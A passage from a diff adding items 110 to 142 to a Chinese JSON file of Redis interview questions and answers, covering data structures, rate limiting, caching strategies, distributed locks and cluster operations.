+      "answer": "Redis 有序集合（ZSet）内部实现采用跳表（skiplist）+ 哈希表（dict）组合结构。跳表：多层有序链表，通过随机层数实现 O(log N) 的插入、删除和范围查询，支持按 score 排序和范围获取（ZRANGE、ZRANGEBYSCORE）。哈希表：存储 member 到 score 的映射，支持 O(1) 的按元素查询分数（ZSCORE）和删除（ZREM）。当数据量较少时，ZSet 使用 ziplist（压缩列表）编码，将所有元素紧凑存储在连续内存中，节省空间，当元素数量或值长度超过阈值（zset-max-ziplist-entries=128、zset-max-ziplist-value=64）时自动转为 skiplist+dict。跳表比红黑树的优势：实现简单、支持范围查找、不需要复杂的旋转再平衡。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis中有序集合的内部如何实现 ？"
+    },
+    {
+      "number": 111,
+      "id": "Redis 数据库面试题-111",
+      "category": "Redis 数据库",
+      "answer": "使用高斯 Redis（GaussDB for Redis，即华为云企业级 Redis）实现二级索引的方法：1）使用 ZSet：将索引字段值作为 score，主键作为 member，通过 ZRANGEBYSCORE 按索引字段范围查询；2）使用 Hash + Set 组合：Hash 存储对象，Set 维护索引映射（如 idx:age:25 → {user:1, user:3}）；3）使用 RediSearch 模块：原生支持二级索引创建（FT.CREATE idx ON hash PREFIX 1 user: SCHEMA name TEXT age NUMERIC），支持全文搜索、聚合查询；4）使用高斯 Redis 的兼容性高级功能（如 JSON 索引）；5）注意维持索引与数据的一致性（写数据时同步更新索引）。",
+      "tags": [
+        "Redis",
+        "索引"
+      ],
+      "question": "简述怎么使用高斯Redis实现二级索引 ？"
+    },
+    {
+      "number": 112,
+      "id": "Redis 数据库面试题-112",
+      "category": "Redis 数据库",
+      "answer": "Redis 内存满了的优化方案：1）分析内存占用：INFO memory 查看 used_memory、MEMORY STATS 查看内部消耗分布；2）排查 Big Key：redis-cli --bigkeys 或 MEMORY USAGE key 排查大 key 并拆分或压缩；3）调整淘汰策略：选择合适的 maxmemory-policy（如 allkeys-lru/lfu）；4）扩容内存物理上限：增加 maxmemory 或升级服务器内存；5）设置合理过期时间：确保不需要持久保留的数据有 TTL；6）优化数据结构编码：调整阈值参数让 Hash/ZSet 使用 ziplist 紧凑编码节省内存；7）清理无用数据：通过 SCAN 遍历 key 找无用的或已过期的 key 主动删除；8）横向扩展：使用 Redis Cluster 将数据分片到多节点；9）冷热分离：热数据存 Redis，冷数据存 SSD/DB。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述解析Redis内存满了怎么去优化 ？"
+    },
+    {
+      "number": 113,
+      "id": "Redis 数据库面试题-113",
+      "category": "Redis 数据库",
+      "answer": "Redis 冷热数据识别与交换的实现方案：1）识别冷热数据：A）Redis 自带 LFU（Least Frequently Used）淘汰策略（Redis 4.0+），OBJECT FREQ key 查询访问频率，高频为热数据、低频为冷数据；B）业务层标记：根据数据访问日志离线分析识别；C）监控 key 的访问频率和最后访问时间；2）冷热交换策略：A）热数据保留在 Redis 内存中并设置较长 TTL；B）冷数据淘汰到 SSD（Redis Enterprise 的 Redis on Flash 方案，自动将 value 存 SSD，key 和索引留内存）；C）应用层冷热交换：冷数据迁移到廉价存储（MySQL/MongoDB/TiKV），访问时回填 Redis；D）设置冷数据的短过期时间，热数据的过期时间自动延长。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis冷热数据识别与交换怎么实现 ？"
+    },
+    {
+      "number": 114,
+      "id": "Redis 数据库面试题-114",
+      "category": "Redis 数据库",
+      "answer": "Redis 有效期设置方法：1）EXPIRE key seconds：设置 key 在 seconds 秒后过期；2）PEXPIRE key milliseconds：毫秒级过期设置；3）EXPIREAT key timestamp：设置 key 在指定的 Unix 时间戳（秒）过期；4）PEXPIREAT key milliseconds-timestamp：毫秒级时间戳过期；5）SET key value EX seconds：设置值的同时设置过期时间（原子操作）；6）SETEX key seconds value：SET + EXPIRE 的原子组合；7）TTL key：查看剩余过期时间（秒），-1 表示未设置，-2 表示 key 不存在；8）PERSIST key：移除过期时间，使 key 永久有效；9）也可以在 Hash、List 等数据结构的元素层面设置过期（需通过业务逻辑实现，Redis 本身不支持）。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述redis有效期在哪设置 ？"
+    },
+    {
+      "number": 115,
+      "id": "Redis 数据库面试题-115",
+      "category": "Redis 数据库",
+      "answer": "Redis 六节点集群（3 主 3 从）安装步骤：1）准备 6 台服务器（或同一台服务器的 6 个端口 7000-7005），每个配置 redis.conf：port 700X、cluster-enabled yes、cluster-config-file nodes-700X.conf、cluster-node-timeout 5000、appendonly yes、daemonize yes；2）启动 6 个 Redis 实例：redis-server redis-700X.conf；3）创建集群：redis-cli --cluster create 127.0.0.1:7000 127.0.0.1:7001 127.0.0.1:7002 127.0.0.1:7003 127.0.0.1:7004 127.0.0.1:7005 --cluster-replicas 1；4）验证集群：redis-cli -c -p 7000 cluster nodes 查看节点信息，cluster info 查看集群状态；5）测试读写：redis-cli -c -p 7000 SET test hello，自动重定向到正确节点。Docker 方式可使用 docker-compose 编排 6 个容器。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis中怎么安装一个六节点集群 ？"
+    },
+    {
+      "number": 116,
+      "id": "Redis 数据库面试题-116",
+      "category": "Redis 数据库",
+      "answer": "Redis 限流的实现方式：1）简单计数器：利用 INCR + EXPIRE 实现固定窗口计数（如每分钟最多 100 次），实现简单但窗口边界有突刺问题；2）滑动窗口（ZSet）：利用 ZSet 的 score 存储请求时间戳，ZREMRANGEBYSCORE 清理过期记录后 ZCOUNT 统计窗口内请求数；3）令牌桶算法：使用 Lua 脚本原子操作维护令牌桶（当前令牌数 + 上次补充时间），支持突发流量；4）漏桶算法：类似令牌桶但以固定速率处理请求，超出的请求排队或拒绝；5）Redis + Lua 脚本实现成熟的限流器（Redis-Cell 模块）；6）Redisson RRateLimiter：封装了令牌桶限流器；7）滑动日志：每次请求记录精确时间戳，计算滑动窗口内请求数。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述redis限流的实现方式有几种？ ？"
+    },
+    {
+      "number": 117,
+      "id": "Redis 数据库面试题-117",
+      "category": "Redis 数据库",
+      "answer": "Redis 秒杀场景超时与超卖问题解决方案：超卖问题：1）使用 DECR 原子操作扣减库存（SET stock 100 → DECR stock，返回值 ≥ 0 才下单成功）；2）Lua 脚本保证判断+扣减原子性（if redis.call('get', KEYS[1]) > 0 then redis.call('decr', KEYS[1]) return 1 else return 0 end）；3）Redis 事务（WATCH + MULTI + EXEC）乐观锁扣库存。超时问题：1）合理设置 Redis 连接超时（connectTimeout）和命令超时（commandTimeout）；2）使用连接池（如 Lettuce/JedisPool）避免频繁建立连接；3）秒杀前预热：提前将库存、商品信息加载到 Redis；4）限流保护：先在网关层做流量控制和排队，减少直接打到 Redis 的并发；5）使用 Redis 集群分摊压力。核心思路：扣库存用原子操作（Lua 脚本最佳），流量用多层限流削峰。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis中秒杀场景下超时与超卖问题如何解决 ？"
+    },
+    {
+      "number": 118,
+      "id": "Redis 数据库面试题-118",
+      "category": "Redis 数据库",
+      "answer": "Redis 缓存更新策略：1）Cache Aside Pattern（旁路缓存）：读时先查缓存，miss 则查 DB 写入缓存；写时先更新 DB 成功后再删除缓存（非更新缓存），由下次读操作重建。最常用，简单可靠。2）Read/Write Through：缓存层作为代理，应用只与缓存交互，缓存负责与 DB 同步读写的细节。3）Write Behind Caching（异步写回）：写入时只写缓存，由后台任务异步批量写回 DB。写入延迟最低，但有数据丢失风险。4）双写策略：同时更新缓存和 DB，需考虑一致性（顺序问题）和失败重试机制。5）Refresh-Ahead：在缓存过期前主动异步刷新热点数据，减少缓存 miss。生产环境推荐 Cache Aside + 延迟双删（防止并发读写脏数据）+ MQ 重试确保删除缓存成功。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis缓存更新策略是什么 ？"
+    },
+    {
+      "number": 119,
+      "id": "Redis 数据库面试题-119",
+      "category": "Redis 数据库",
+      "answer": "Redis 数据量过大的处理方案：1）数据分片：使用 Redis Cluster 将数据分散到多个节点，每个节点只负责部分数据；2）冷热分离：热数据留 Redis（内存），冷数据迁移到 SSD（Redis Enterprise Flash）或廉价存储（MySQL/MongoDB），访问时回填；3）设置合理过期时间：确保不必要的数据有过期策略，及时自动删除；4）数据压缩：对大的 String value 压缩（snappy/LZ4）后存储；5）数据清理：定期通过 SCAN 检查删除无用/过期数据；6）垂直拆分：按业务线拆分为多个独立 Redis 集群；7）使用云厂商大容量 Redis（如腾讯云 4TB 集群、阿里云 Tair）；8）优化数据结构：将 String 改为 Hash 利用 ziplist 压缩；9）评估是否真的需要全量存 Redis——部分数据可以只存 DB。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述redis数据量过大怎么办 ？"
+    },
+    {
+      "number": 120,
+      "id": "Redis 数据库面试题-120",
+      "category": "Redis 数据库",
+      "answer": "Redis 在分布式任务处理中的容错与恢复策略：1）任务持久化：使用 Redis Stream 或 List 存储任务，数据持久化（RDB+AOF）保证不因 Redis 重启丢失；2）消费者组 ACK 机制（Stream）：消费者完成任务后发送 XACK，未 ACK 的消息通过 XPENDING 追踪，超时后 XCLAIM 重新分配给其他消费者；3）消费者心跳：消费者定时上报心跳，监控系统检测心跳超时自动摘除故障消费者并重新分配任务；4）幂等设计：任务处理逻辑做成幂等的（通过唯一任务 ID 去重），防止重复处理；5）死信队列：超过重试次数仍未成功的任务转移至死信队列人工处理；6）主从+哨兵保证 Redis 本身的高可用；7）分布式锁防重：同一个任务只被一个消费者获取和处理。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis在分布式任务处理中的容错与恢复策略 ？"
+    },
+    {
+      "number": 121,
+      "id": "Redis 数据库面试题-121",
+      "category": "Redis 数据库",
+      "answer": "Redis 在大规模数据处理中的优化策略与性能调优：1）使用集群分片：通过 Redis Cluster 将数据分散到多节点并行处理；2）Pipeline 批量操作：将大量命令打包批量发送，减少网络往返次数；3）Lua 脚本：将多步操作封装为 Lua 脚本在 Redis 服务端原子执行，减少网络开销和保证原子性；4）SCAN 替代 KEYS：渐进式遍历 key 避免阻塞；5）异步删除 UNLINK：大 key 删除不阻塞主线程；6）合理选择数据结构：根据访问模式选择最优数据类型（如统计数据用 HyperLogLog、去重用 Set、排序用 ZSet）；7）内存优化：调整内部编码阈值、开启压缩、合理设置过期时间；8）多线程 I/O 开启（6.0+）：io-threads 参数调优网络性能；9）持久化调优：RDB 的 save 间隔、AOF 的 fsync 策略。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis在大规模数据处理中的优化策略与性能调优 ？"
+    },
+    {
+      "number": 122,
+      "id": "Redis 数据库面试题-122",
+      "category": "Redis 数据库",
+      "answer": "Redis 存储用户 token 的解决方案：1）基本方案：String 类型，key 为 user:token:<token_value>，value 为用户信息（JSON 序列化），SETEX 设置过期时间与 token 过期时间一致；2）使用 Hash 优化内存：HSET user:tokens token_value user_id（当 token 数量很大时更省内存）；3）Token 刷新：更新过期时间（EXPIRE key new_ttl）或重新 SETEX；4）黑名单/登出：DELETE token key 或维护一个黑名单 Set/ZSet；5）多设备登录：为每个用户维护一个 Set 存储所有有效 token（user:tokens:uid），方便统一管理和批量踢出；6）安全措施：token 本身应随机生成（UUID/加密随机串），存储时 value 可加密敏感信息，建议配合 HTTPS 传输；7）大规模场景：使用 Redis Cluster 分片存储，key 设计为 {user_id}:token:xxx 用 Hash Tag 保证同一用户 token 在同一节点。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis存储用户token问题怎么解决 ？"
+    },
+    {
+      "number": 123,
+      "id": "Redis 数据库面试题-123",
+      "category": "Redis 数据库",
+      "answer": "Redis slowlog（慢查询日志）用于记录执行时间超过指定阈值的命令，帮助排查性能问题。配置：1）slowlog-log-slower-than 10000（单位微秒，10000=10ms，0=记录所有命令，负数=禁用）；2）slowlog-max-len 128（最多保留条数，FIFO 队列）。使用命令：SLOWLOG GET N 获取最近 N 条慢查询；SLOWLOG LEN 获取当前慢查询数量；SLOWLOG RESET 清空慢查询日志。每条记录包含：id（序号）、timestamp（Unix 时间戳）、duration（执行耗时微秒）、command（命令和参数）、client IP:PORT（4.0+）、client name（如果设置了 CLIENT SETNAME）。排查建议：关注 KEYS、大集合的 O(N) 命令、未使用 Pipeline 的大量单个命令。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis中slowlog有什么用 ？"
+    },
+    {
+      "number": 124,
+      "id": "Redis 数据库面试题-124",
+      "category": "Redis 数据库",
+      "answer": "Redis 过期键删除策略原理：采用惰性删除+定期删除两种方式结合。1）惰性删除（Lazy Expiration）：当客户端尝试访问某个 key 时（执行 GET、HGET 等），Redis 先检查 key 是否有过期时间且是否已到期，若到期则删除 key 并返回空值给客户端。优点是 CPU 友好（只在访问时检查），缺点是过期 key 如果一直不访问会一直占用内存。2）定期删除（Active Expiration）：Redis 内部维护一个定时任务（默认每秒 hz=10 次），每次随机从过期字典中抽取一批 key（默认 20 个），检查并删除其中已过期的 key。如果这批 key 中过期比例超过 25%，则继续重复抽样删除，直到比例低于 25% 或达到时间上限（默认 25ms）停止。这种策略在 CPU 开销和内存回收之间取得平衡。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis的过期键删除策略原理说明 ？"
+    },
+    {
+      "number": 125,
+      "id": "Redis 数据库面试题-125",
+      "category": "Redis 数据库",
+      "answer": "Spring Boot 整合 Spring Cache 实现 Redis 缓存：1）添加依赖：spring-boot-starter-cache + spring-boot-starter-data-redis；2）配置 application.yml：spring.cache.type=redis、spring.redis.host/port/password；3）启用缓存：在启动类加 @EnableCaching；4）使用注解：@Cacheable(value='cacheName', key='#id') 查询缓存（先查缓存 miss 则执行方法并回填）、@CachePut(value='cacheName', key='#result.id') 更新缓存（始终执行方法并更新缓存）、@CacheEvict(value='cacheName', key='#id') 删除缓存、@Caching 组合多个操作；5）配置 CacheManager：可自定义 RedisCacheManager，设置默认过期时间、序列化方式（推荐 Jackson2JsonRedisSerializer 或 GenericJackson2JsonRedisSerializer）；6）配置 key 生成策略：自定义 KeyGenerator 或使用 SpEL 表达式；7）高级功能：配置缓存穿透保护（空值缓存）、缓存雪崩保护（随机过期时间）、缓存预热等。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述SpringBoot怎么整合Spring Cache实现Redis缓存 ？"
+    },
+    {
+      "number": 126,
+      "id": "Redis 数据库面试题-126",
+      "category": "Redis 数据库",
+      "answer": "Redis Bitmap（位图）是基于 String 类型的位操作扩展，本质是将 String 当作一个巨大的 bit 数组使用。每个位只能存储 0 或 1，非常适合记录二值状态（是/否、签到/未签到）。命令：SETBIT key offset value（设置某位的值 0/1）、GETBIT key offset（获取某位的值）、BITCOUNT key [start end]（统计为 1 的位数）、BITPOS key bit [start end]（查找第一个为 0/1 的位置）、BITOP AND/OR/XOR/NOT destkey key1 key2...（位运算）、BITFIELD key（批量读写多位）。典型应用：用户签到打卡、在线状态统计、布隆过滤器实现、权限标记、日活/月活（UV）统计。优势：极省内存（8 个用户只用 1 字节），1 亿用户约 12MB。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis中的Bitmap如何使用 ？"
+    },
+    {
+      "number": 127,
+      "id": "Redis 数据库面试题-127",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群故障检测通过 Gossip 协议实现，分为主观下线（PFAIL）和客观下线（FAIL）两个阶段：1）心跳检测：每个节点每秒随机 ping 几个其他节点，如果某个节点超过 cluster-node-timeout 时间未回复 pong，发送 ping 的节点将其标记为主观下线（PFAIL - Possibly Fail）；2）信息传播：节点通过 Gossip ping/pong 消息中携带的 gossip 段，将自己知道的其他节点状态（包括 PFAIL 标记）传播给其他节点；3）客观下线判断：当某个节点收到超过半数的主节点都认为节点 X 是 PFAIL 时，将 X 标记为客观下线（FAIL），并向集群广播 FAIL 消息；4）收到 FAIL 消息的节点强制将 X 标记为 FAIL；5）从节点发现其主节点 FAIL 后启动选举流程。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis集群怎么进行故障检测？ ？"
+    },
+    {
+      "number": 128,
+      "id": "Redis 数据库面试题-128",
+      "category": "Redis 数据库",
+      "answer": "Redis Stream 是 5.0 引入的特殊数据类型，实现持久化的、支持多播和消费者组的消息队列。核心特点：1）消息 ID 格式为 <millisecondsTime>-<sequenceNumber>，自动生成全局唯一且递增；2）消息为 field-value 键值对列表（类似 Hash），追加写入，不可修改；3）支持消费者组（Consumer Group），同组内多个消费者并行消费，每条消息只被一个消费者处理（类似 Kafka 的 consumer group）；4）支持消息确认（XACK）、pending 消息查询（XPENDING）、消息重分配（XCLAIM）、消息回溯（XREAD 支持从任意 ID 读取）；5）数据可持久化到磁盘（AOF/RDB）；6）底层使用 rax 基数树存储，内存效率高。相比 List 队列：支持 ACK、消费者组、故障恢复。相比 Pub/Sub：支持持久化、消息回溯。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis特殊数据类型之stream ？"
+    },
+    {
+      "number": 129,
+      "id": "Redis 数据库面试题-129",
+      "category": "Redis 数据库",
+      "answer": "Redis 分布式锁续期实现方案：1）Redisson 看门狗（Watch Dog）：获取锁时如果不显式设置过期时间，Redisson 自动启用看门狗机制，每隔 lockTimeout/3（默认 10 秒）自动检查并续期（使用 Lua 脚本判断锁是否仍被当前线程持有，是则延长过期时间），业务完成后手动 unlock 停止续期；2）手动续期：业务启动一个后台定时线程，在锁过期前定期 EXPIRE key new_ttl，需要保证 key 的 value（锁标识）与当前持有者一致；3）Lua 脚本续期：if redis.call('get', KEYS[1]) == ARGV[1] then return redis.call('pexpire', KEYS[1], ARGV[2]) else return 0 end，保证判断和续期原子性；4）自主实现：SET key value NX EX time 获取锁后，起定时器周期使用 Lua 脚本延长时间。推荐直接使用 Redisson 的 RLock，看门狗机制成熟可靠。",
+      "tags": [
+        "Redis",
+        "锁"
+      ],
+      "question": "简述Redis分布式锁该怎么实现续期 ？"
+    },
+    {
+      "number": 130,
+      "id": "Redis 数据库面试题-130",
+      "category": "Redis 数据库",
+      "answer": "保证 MySQL 和 Redis 双写一致性的方案：1）Cache Aside（推荐）：写操作先更新 MySQL 成功 → 删除 Redis 缓存（非更新缓存）→ 等下次读请求回填缓存。若有缓存删除失败，通过 MQ 重试或订阅 binlog 补偿删除。2）延时双删：先删缓存 → 更新 DB → sleep(几百ms) → 再次删缓存（防止并发读重建的脏数据）。3）基于 binlog 异步同步：Canal 监听 MySQL binlog → 发送 MQ → 消费者更新/删除 Redis 缓存（最终一致性，解耦业务代码）。4）强一致性方案：使用分布式事务框架（Seata AT/TCC）保证 MySQL 和 Redis 操作要么都成功要么都失败，但性能差。5）设置过期时间兜底：Redis 缓存数据自带 TTL 作为最后保障。6）读写串行化（不推荐，性能极差）。推荐：Cache Aside + binlog 异步补偿 + TTL 兜底。",
+      "tags": [
+        "Redis",
+        "MySQL",
+        "SQL"
+      ],
+      "question": "简述如何保证mysql和redis的双写一致性 ？"
+    },
+    {
+      "number": 131,
+      "id": "Redis 数据库面试题-131",
+      "category": "Redis 数据库",
+      "answer": "使用 Redis 实现搜索接口的方案：1）反向索引（Set/ZSet）：将搜索词作为 key，文档 ID 集合作为 value。如 idx:keyword:python → Set{1, 3, 5}，搜索时取关联文档 ID 集合。多个关键词用 SINTER 取交集（AND 逻辑）、SUNION 取并集（OR 逻辑）。2）前缀搜索（ZSet）：将所有搜索词按字母序作为 member 放入 ZSet，score 为 0，通过 ZRANGEBYLEX 按字典区间查询实现前缀匹配。3）RediSearch 模块（推荐）：FT.CREATE 建立全文索引，支持 TEXT/NUMERIC/TAG/GEO 等字段类型，支持中文分词、模糊搜索、聚合查询、排序分页，性能接近 Elasticsearch。4）模糊匹配：KEYS pattern（仅测试环境）或 SCAN + MATCH pattern。建议：简单搜索用 ZSet + Set，专业搜索用 RediSearch 或 Elasticsearch。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述怎么用Redis实现搜索接口 ？"
+    },
+    {
+      "number": 132,
+      "id": "Redis 数据库面试题-132",
+      "category": "Redis 数据库",
+      "answer": "Redis 限制 IP 访问次数的方法（固定窗口限流）：1）使用 INCR + EXPIRE：key = rate_limit:<IP>，value = 当前窗口请求计数。每次请求执行：count = INCR key；如果 count == 1 则 EXPIRE key window_seconds；如果 count > max_requests 则拒绝请求。2）Lua 脚本原子化（推荐）：将检查、递增、设置过期封装为一个 Lua 脚本原子执行，避免竞态。3）滑动窗口 ZSet（更精确）：用 ZSet 的 score 存请求微秒时间戳，每次请求 ZADD 添加当前时间戳，ZREMRANGEBYSCORE 清理窗口外的记录，ZCOUNT 统计窗口内请求数，超限则拒绝。4）令牌桶/漏桶算法（更平滑）：使用 Redis-Cell 模块或 Redisson RRateLimiter。5）多层限流：网关层（Nginx rate limiting）+ 应用层（Redis）组合防护。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述redis限制IP访问次数的方法 ？"
+    },
+    {
+      "number": 133,
+      "id": "Redis 数据库面试题-133",
+      "category": "Redis 数据库",
+      "answer": "Redis 优惠券秒杀问题解决方案：1）库存预热：活动开始前将优惠券库存加载到 Redis（SET stock_key total_count）；2）扣库存原子操作：Lua 脚本保证「判断库存是否充足 + 扣减」原子执行，避免超卖：if redis.call('get', KEYS[1]) > 0 then redis.call('decr', KEYS[1]) return 1 else return 0 end；3）用户去重：用 Set 或 Bitmap 记录已抢到的用户 ID，防止重复领取；4）请求削峰：在应用层或网关层使用令牌桶/漏桶限流，排队请求（使用 Redis List 队列缓冲瞬时大流量）；5）异步处理：Redis 扣库存成功后通过 MQ 异步写 MySQL 订单数据，减轻数据库压力；6）预热数据：提前将用户信息、商品信息缓存到 Redis；7）兜底方案：扣库存失败的请求直接返回已抢光，不穿透到数据库。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis优惠券秒杀问题怎么解决 ？"
+    },
+    {
+      "number": 134,
+      "id": "Redis 数据库面试题-134",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群分配哈希槽的方式：1）自动分配（redis-cli --cluster create）：创建集群时自动将 16384 个槽平均分配给所有主节点（如 3 个主节点则每个约 5461 个槽）；2）手动分配：使用 CLUSTER ADDSLOTS slot [slot ...] 为节点分配指定槽号范围，CLUSTER DELSLOTS 删除分配的槽；3）槽迁移：redis-cli --cluster reshard host:port 交互式迁移槽，指定迁移的槽数量、来源节点、目标节点；4）自动均衡：redis-cli --cluster rebalance host:port 自动检测各节点槽数并迁移使分布更均匀；5）CLUSTER SETSLOT <slot> MIGRATING/IMPORTING 手动控制单个槽的迁移状态。槽分配原则：尽可能均匀分配、迁移过程中要保证数据一致性（ASK 重定向机制）。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述redis集群如何分配哈希槽 ？"
+    },
+    {
+      "number": 135,
+      "id": "Redis 数据库面试题-135",
+      "category": "Redis 数据库",
+      "answer": "Python 中 Sub-Pub 机制实现 Redis 订阅与发布：使用 redis-py 库。发布端：import redis; r = redis.Redis(host='localhost', port=6379); r.publish('channel_name', 'message')。订阅端：import redis; r = redis.Redis(...); pubsub = r.pubsub(); pubsub.subscribe('channel_name', 'channel2'); for message in pubsub.listen(): if message['type'] == 'message': print(message['data']) 或使用 pubsub.get_message() 非阻塞获取。模式订阅：pubsub.psubscribe('news.*') 匹配多个频道。线程安全：listen() 是阻塞的，通常在单独的线程中运行订阅循环。异步支持：redis-py 的 asyncio 版本（redis.asyncio.Redis）支持异步 Pub/Sub。注意：Pub/Sub 不持久化，离线期间消息会丢失；集群内消息广播到所有节点。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述python中sub-pub机制怎么实现Redis的订阅与发布 ？"
+    },
+    {
+      "number": 136,
+      "id": "Redis 数据库面试题-136",
+      "category": "Redis 数据库",
+      "answer": "Redis 批量删除 key 的解决方案：1）使用 xargs + redis-cli：redis-cli KEYS 'prefix:*' | xargs redis-cli DEL（生产环境慎用 KEYS，会阻塞）；2）使用 SCAN + DEL：redis-cli --scan --pattern 'prefix:*' | xargs redis-cli DEL（非阻塞，推荐生产使用）；3）Lua 脚本：eval \"local keys = redis.call('keys', ARGV[1]) return redis.call('del', unpack(keys))\" 0 prefix:*（慎用 KEYS 在大数据量时阻塞）；4）UNLINK 替代 DEL（Redis 4.0+）：异步删除大 key 不阻塞主线程；5）分批删除：使用 SCAN 每次返回部分 key，分批执行 DEL/UNLINK；6）如果是按 key 模式批量删除，可以在写入时维护一个 Set 存储相关 key，删除时直接读 Set 中的 key 列表。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述redis批量删除key值的问题怎么解决 ？"
+    },
+    {
+      "number": 137,
+      "id": "Redis 数据库面试题-137",
+      "category": "Redis 数据库",
+      "answer": "Redis 实现分布式事务的负载均衡与容量规划：1）数据分片：使用 Redis Cluster，将事务涉及的 key 通过 Hash Tag（{xxx}）确保路由到同一节点，使事务在单节点内执行；2）负载均衡：在集群模式下，合理规划 key 的分布（利用 Hash Tag 控制相关 key 聚集，同时避免单个节点过热），可通过 redis-cli --cluster rebalance 调整槽分布；3）容量规划：估算总数据量（key 数量 × 平均 value 大小 × 副本数），评估节点数 = 总数据量 / 单节点 maxmemory，并预留 30% 增长空间；4）事务不是跨节点的（Redis 集群限制），需在应用层设计时考虑此约束；5）分布式事务场景复杂时可考虑使用 Redisson 的 RTransaction 或基于消息队列的 Saga 模式。",
+      "tags": [
+        "Redis",
+        "事务"
+      ],
+      "question": "简述Redis实现分布式事务的负载均衡与容量规划 ？"
+    },
+    {
+      "number": 138,
+      "id": "Redis 数据库面试题-138",
+      "category": "Redis 数据库",
+      "answer": "Redis 在容器编排与部署中的应用：1）Kubernetes StatefulSet 部署 Redis 集群：利用 StatefulSet 的稳定网络标识（pod-0.svc-name）和持久存储卷（PVC），适合部署 Redis 哨兵和集群模式；2）Headless Service：为 Redis 节点提供稳定的 DNS 解析，节点间通过 DNS 发现彼此；3）ConfigMap 管理 Redis 配置：将 redis.conf 存储为 ConfigMap 挂载到容器中；4）健康检查：使用 liveness probe（redis-cli ping）和 readiness probe（redis-cli ping）；5）Redis Operator 简化管理：如 spotahome/redis-operator 自动创建和管理 Redis 集群（节点发现、故障转移、备份）；6）Helm Charts：使用社区 Helm Chart 一键部署 Redis HA/Cluster；7）Docker Compose 快速搭建开发和测试环境；8）注意持久化数据与存储卷绑定（防止 Pod 漂移丢失数据）。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis在容器编排与部署中的应用 ？"
+    },
+    {
+      "number": 139,
+      "id": "Redis 数据库面试题-139",
+      "category": "Redis 数据库",
+      "answer": "Spring Boot 基于 Redis 快速搭建分布式 Session 缓存：1）添加依赖：spring-boot-starter-data-redis + spring-session-data-redis；2）配置 application.yml：spring.session.store-type=redis、spring.redis.host/port/password、spring.session.timeout=30m（Session 过期时间）；3）启动类无需额外注解，添加依赖即自动启用 Redis Session 管理；4）Session 自动序列化存储到 Redis（key 格式：spring:session:sessions:<sessionId>），支持 JSON/JDK 序列化方式可选；5）多应用实例共享 Session：所有实例指向同一个 Redis，用户登录后切换服务器无需重新登录；6）Session 事件监听：@EventListener 监听 SessionCreatedEvent、SessionDestroyedEvent、SessionExpiredEvent；7）自定义 Cookie 策略：配置 server.servlet.session.cookie.*（name、path、httpOnly、secure 等）；8）生产环境建议配置 Redis 哨兵/集群保证 Session 存储高可用。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述如何使用Spring boot基于Redis快速搭建分布式Session缓存 ？"
+    },
+    {
+      "number": 140,
+      "id": "Redis 数据库面试题-140",
+      "category": "Redis 数据库",
+      "answer": "Redis 的异步机制主要体现在以下方面：1）异步删除（4.0+）：UNLINK 命令异步删除 key（先解除 key 空间引用，后台线程惰性释放内存），避免 DEL 大 key 阻塞主线程；FLUSHDB ASYNC/FLUSHALL ASYNC 异步清空数据库。2）AOF 持久化：BGREWRITEAOF 通过 fork 子进程异步重写 AOF 文件，主进程继续处理请求。3）RDB 持久化：BGSAVE 通过 fork 子进程异步生成 RDB 快照。4）主从复制：主节点将 RDB 和 replication buffer 数据异步发送给从节点。5）多线程 I/O（6.0+）：网络数据读写由 io-threads 异步处理，命令执行仍单线程。6）Redis 6.0+ 的客户端缓存（Client Side Caching）采用异步通知机制。7）Lazy Free（惰性释放）：后台线程异步回收过期 key 的内存（lazyfree-lazy-eviction、lazyfree-lazy-expire 等参数控制）。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis的异步机制是什么 ？"
+    },
+    {
+      "number": 141,
+      "id": "Redis 数据库面试题-141",
+      "category": "Redis 数据库",
+      "answer": "Redis 类型（TYPE）与编码（ENCODING）原理及使用方法：TYPE key 返回 key 对应的数据类型（string、list、set、zset、hash、stream 之一）。OBJECT ENCODING key 返回该类型底层使用的内部编码。每种类型可能有多种编码实现：String 有 int（整数）、embstr（短字符串≤44字节）、raw（长字符串）；List 有 quicklist（3.2+默认）；Hash 有 ziplist（listpack 7.0+）、hashtable；Set 有 intset（全整数）、hashtable；ZSet 有 ziplist（listpack）、skiplist+dict。编码转换由 Redis 根据数据大小和数量自动触发（阈值可配置如 hash-max-ziplist-entries）。DEBUG OBJECT key 可查看更多元数据。了解编码有助于优化内存（尽量使用紧凑编码）和排查性能问题。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis类型type与编码encoding原理及使用方法是什么 ？"
+    },
+    {
+      "number": 142,
+      "id": "Redis 数据库面试题-142",
+      "category": "Redis 数据库",
